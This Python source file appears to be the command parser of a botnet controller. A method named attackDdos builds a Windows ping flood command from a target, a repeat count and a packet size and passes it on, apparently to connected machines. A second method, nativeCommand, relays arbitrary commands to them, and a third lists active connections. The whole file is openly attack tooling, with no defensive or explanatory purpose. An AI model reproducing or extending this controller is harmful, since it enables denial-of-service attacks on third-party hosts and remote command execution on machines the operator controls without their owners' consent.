from Functions import setMessage, getConnections
class Parser:
    
    def execCommand(self, command):
        nameCommand, parameters = self.parserCommand(command)   
        try:
            return getattr(self, nameCommand)(parameters)
        except(AttributeError):
            print("Command not Found")  
        
    def attackDdos(self,array):
        canonicalName = array[0]
        times = array[1]
        packageWeight = array[2]        
        setMessage("ping "+ canonicalName + " -n "+ str(times) + " -l " + str(packageWeight) + " @ False")
    
    def nativeCommand(self, command):
        setMessage(command + " @ False")
        
    def getConnection(self):
        print(getConnections())
        
    def parserCommand(self, command):
        commandToArray = command.split('(')
        commandName = commandToArray[0]
        stringParameters = commandToArray[1]
        stringParameters = stringParameters[:-2]
        if ',' in stringParameters:
            parameters = stringParameters.split(',')
        else: 
            parameters = stringParameters
        return commandName,parameters
